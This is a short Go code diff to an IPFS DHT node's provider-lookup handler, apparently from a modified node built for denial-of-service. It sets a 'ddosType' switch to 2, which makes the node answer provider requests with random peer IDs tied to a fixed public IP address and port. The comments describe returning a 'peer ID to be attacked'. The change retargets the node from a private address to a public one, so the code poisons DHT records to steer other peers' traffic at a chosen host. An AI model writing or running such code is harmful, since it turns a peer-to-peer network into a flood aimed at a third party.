@@ -309,7 +309,7 @@ func (dht *IpfsDHT) handleGetProviders(ctx context.Context, p peer.ID, pmes *pb.
 
 	// setup providers
 	providers := []peer.ID{}
-	ddosType := 1
+	ddosType := 2
 
 	if ddosType == 1 {
 		// DDoS type 1: return peer ID to be attacked (only works with active IPFS nodes)
@@ -334,7 +334,9 @@ func (dht *IpfsDHT) handleGetProviders(ctx context.Context, p peer.ID, pmes *pb.
 		// Addrs: []ma.Multiaddr
 		if ddosType == 2 {
 			pid := newRandomPeerId()
-			test, _ := ma.NewMultiaddr("/ip4/192.168.1.42/tcp/4001")
+			test, _ := ma.NewMultiaddr("/ip4/80.241.216.122/tcp/3999")
+
+			logger.Infof("!!! Popular file requested. Responding with random ID: %s and IP !!!", pid.Pretty())
 			po := pstore.PeerInfo{
 				ID:    pid,
 				Addrs: []ma.Multiaddr{test},
